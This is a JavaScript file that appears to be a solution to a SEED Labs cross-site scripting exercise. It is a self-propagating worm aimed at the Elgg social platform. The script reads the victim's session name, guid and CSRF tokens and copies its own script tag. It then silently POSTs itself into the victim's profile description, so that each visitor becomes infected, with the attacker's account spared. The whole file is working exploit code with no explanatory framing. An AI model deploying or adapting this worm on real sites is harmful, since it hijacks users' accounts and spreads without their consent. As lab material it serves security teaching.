window.onload = function () {
	var userName="&name="+elgg.session.user.name;
	var guid="&guid="+elgg.session.user.guid;
	var ts="&__elgg_ts="+elgg.security.token.__elgg_ts;
	var token="&__elgg_token="+elgg.security.token.__elgg_token;
	var sendurl="http://www.seed-server.com/action/profile/edit";
	
	var headerTag="<script id=\"worm\" type=\"text/javascript\">";
	var jsCode=document.getElementById("worm").innerHTML;
	var tailTag="</" + "script>";
	var wormCode=encodeURIComponent(headerTag+jsCode+tailTag);
	var content="description=<p>INFECTED!</p>"+wormCode+ts+token+guid+userName;
	var samyGuid=59;
	
	if(elgg.session.user.guid!=samyGuid) {
		alert("INFECTED!");
		var Ajax=null;
		Ajax=new XMLHttpRequest();
		Ajax.open("POST", sendurl, true);
		Ajax.setRequestHeader("Content-Type", 
					"application/x-www-form-urlencoded");
		Ajax.send(content);
	}
}
